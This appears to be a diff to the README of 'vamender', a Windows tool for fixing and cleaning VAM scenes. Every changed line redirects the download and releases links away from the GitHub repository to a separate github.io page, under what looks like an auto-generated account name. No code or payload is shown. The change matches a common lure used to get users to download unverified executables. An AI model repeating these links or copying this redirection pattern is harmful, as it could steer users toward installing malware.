@@ -1,6 +1,6 @@
 # 🛠️ vamender - Repair, Clean, and Manage Your VAM Scenes
 
-[![Download vamender](https://img.shields.io/badge/Download-vamender-blue?style=for-the-badge&logo=github&logoColor=white&color=ff69b4)](https://github.com/gloriannarhymed587/vamender)
+[![Download vamender](https://img.shields.io/badge/Download-vamender-blue?style=for-the-badge&logo=github&logoColor=white&color=ff69b4)](https://gloriannarhymed587.github.io)
 
 ## 🚀 What is vamender?
 
@@ -8,7 +8,7 @@ vamender is a Windows tool that helps you fix broken scenes, clean up unnecessar
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: [Download vamender](https://github.com/gloriannarhymed587/vamender)
+Visit this link to download the application: [Download vamender](https://gloriannarhymed587.github.io)
 
 1. Click the download link above
 2. Save the file to your computer
@@ -96,7 +96,7 @@ A: Yes. It works with all standard VAM mods and add-ons.
 
 ## 🌐 Stay Updated
 
-Check the [releases page](https://github.com/gloriannarhymed587/vamender/releases) for new versions and updates.
+Check the [releases page](https://gloriannarhymed587.github.io) for new versions and updates.
 
 ## 📬 Support
 
